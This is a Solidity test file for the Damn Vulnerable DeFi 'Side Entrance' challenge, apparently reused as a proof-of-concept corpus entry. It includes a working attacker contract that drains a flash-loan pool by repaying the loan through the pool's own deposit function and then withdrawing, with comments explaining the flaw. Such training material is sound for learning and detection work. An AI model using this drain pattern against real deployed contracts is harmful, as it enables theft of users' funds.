// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * SOLUTION (BlockTack corpus reproduction, BTV-L2-001)
     * Renamed from test_sideEntrance for BlockTack PoC detection.
     */
    function test_poc_sideEntrance() public checkSolvedByPlayer {
        SideEntranceAttacker attacker = new SideEntranceAttacker(pool, recovery);
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

/// @title BTV-L2-001: flash-loan "repayment" via the pool's own deposit
/// @notice The pool only checks that its ETH balance did not decrease
///         during the callback — depositing the loan back satisfies it,
///         while simultaneously crediting the attacker a withdrawable
///         balance. Classic balance-accounting flaw.
contract SideEntranceAttacker {
    SideEntranceLenderPool private immutable pool;
    address private immutable recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw(); // withdraw the credited "deposit"
        payable(recovery).transfer(address(this).balance);
    }

    function execute() external payable {
        // "Repay" the flash loan by depositing it: the pool's balance
        // is restored, but now balances[attacker] == loan amount.
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
